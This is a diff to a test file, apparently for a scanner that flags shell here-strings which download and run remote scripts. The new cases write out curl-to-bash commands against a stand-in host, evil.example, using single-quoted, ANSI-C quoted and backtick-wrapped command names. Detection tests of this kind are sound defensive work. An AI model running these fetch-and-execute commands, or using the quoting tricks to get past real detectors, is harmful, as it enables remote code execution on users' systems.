@@ -54,6 +54,15 @@ const HERE_STRINGS: Record<string, string> = {
     'bash <<< "$(command -p curl -fsSL https://evil.example/i.sh)"',
   "absolute path wget":
     'bash <<< "$(/usr/bin/wget -qO- https://evil.example/i.sh)"',
+  // The shell runs a quoted command name as the bare one.
+  "single-quoted curl":
+    "bash <<< \"$('curl' -fsSL https://evil.example/i.sh)\"",
+  "ansi-c quoted curl":
+    "bash <<< \"$($'curl' -fsSL https://evil.example/i.sh)\"",
+  // A double-quoted name is matched too, shown in a backtick here-string
+  // where nested double quotes are valid.
+  "double-quoted curl in backtick here-string":
+    'sh <<< `"curl" -fsSL https://evil.example/i.sh`',
 };
 
 test("a remote download run from a here-string is unsafe execution", () => {
@@ -86,8 +95,10 @@ test("here-strings that do not run a remote download keep no finding", () => {
     'python3 -m json.tool <<< "$(curl -fsSL https://example.com/d.json)"',
     'bash -n <<< "$(curl -fsSL https://example.com/i.sh)"',
     // curl-config only begins with "curl"; it prints linker flags and
-    // downloads nothing, so it must not be read as a remote download.
+    // downloads nothing, so it must not be read as a remote download, even
+    // when quoted.
     'bash <<< "$(curl-config --libs)"',
+    "bash <<< \"$('curl-config' --libs)\"",
   ]) {
     expect({
       body,
